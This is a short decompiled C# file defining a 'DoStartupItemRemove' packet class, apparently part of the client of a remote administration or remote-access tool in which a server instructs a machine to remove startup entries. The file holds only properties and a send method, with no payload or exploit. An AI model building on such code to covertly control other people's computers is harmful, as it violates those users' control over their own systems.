using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x0200009C RID: 156
	[Serializable]
	public class DoStartupItemRemove : IPacket
	{
		// Token: 0x1700009F RID: 159
		// (get) Token: 0x060003F7 RID: 1015 RVA: 0x00003FB4 File Offset: 0x000021B4
		// (set) Token: 0x060003F8 RID: 1016 RVA: 0x00003FBC File Offset: 0x000021BC
		public string Name { get; set; }

		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x060003F9 RID: 1017 RVA: 0x00003FC5 File Offset: 0x000021C5
		// (set) Token: 0x060003FA RID: 1018 RVA: 0x00003FCD File Offset: 0x000021CD
		public string Path { get; set; }

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x060003FB RID: 1019 RVA: 0x00003FD6 File Offset: 0x000021D6
		// (set) Token: 0x060003FC RID: 1020 RVA: 0x00003FDE File Offset: 0x000021DE
		public int Type { get; set; }

		// Token: 0x060003FD RID: 1021 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoStartupItemRemove()
		{
		}

		// Token: 0x060003FE RID: 1022 RVA: 0x00003FE7 File Offset: 0x000021E7
		public DoStartupItemRemove(string name, string path, int type)
		{
			this.Name = name;
			this.Path = path;
			this.Type = type;
		}

		// Token: 0x060003FF RID: 1023 RVA: 0x00004004 File Offset: 0x00002204
		public void Execute(Client client)
		{
			client.Send<DoStartupItemRemove>(this);
		}
	}
}
